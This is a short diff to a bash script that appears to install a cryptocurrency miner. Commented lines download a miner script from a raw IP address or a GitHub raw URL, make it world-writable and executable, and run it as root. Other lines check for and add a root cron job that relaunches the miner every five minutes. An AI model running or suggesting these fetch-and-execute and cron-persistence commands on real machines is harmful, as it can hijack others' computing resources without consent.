@@ -1,6 +1,7 @@
 #!/bin/bash
 
 #rm ~/khd.py ~/miner8009.sh;wget http://150.158.140.31/miner8009.sh -P /root/ &&chmod 777 ~/miner8009.sh&&~/miner8009.sh&&tail /etc/crontab
+#rm ~/khd.py ~/miner8009.sh;wget https://raw.githubusercontent.com/yese888/miner8009/main/khd.py -P /root/ &&chmod 777 ~/miner8009.sh&&~/miner8009.sh&&tail /etc/crontab
 #echo  "*/5 *    * * *   root  /root/miner8009.sh"  >> /etc/crontab
 
 if ! grep -q "/root/miner8009.sh" /etc/crontab; then
